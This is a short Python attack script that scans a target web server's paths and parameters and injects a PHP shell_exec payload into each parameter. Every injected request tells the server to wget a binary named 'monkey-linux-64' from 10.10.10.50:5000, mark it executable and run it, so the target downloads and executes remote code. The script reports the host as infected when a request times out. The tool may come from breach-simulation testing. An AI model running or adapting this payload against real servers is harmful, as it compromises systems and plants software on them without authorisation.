import requests
import eventlet
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="IP address of the website")
args = parser.parse_args()

dir = open("file", "r")
params = open("params", "r")
base_url = "http://" + args.ip + "/"

for item in dir:
	request = requests.get(base_url + item.rstrip('\n'))
	if request.status_code == 200:
		params.seek(0)
		for param in params:
			try:
				launch = requests.get(base_url + item.rstrip('\n') + '?' + param.rstrip('\n') + '=$output=shell_exec("wget --no-check-certificate https://10.10.10.50:5000/api/monkey/download/monkey-linux-64; chmod 777 monkey-linux-64; ./monkey-linux-64 m0nk3y -s 10.10.10.50:5000");echo "<pre>$output</pre>";', verify = False, timeout=5)
			except requests.exceptions.ReadTimeout:
				sys.exit("host is infected")
print("host is not infected")
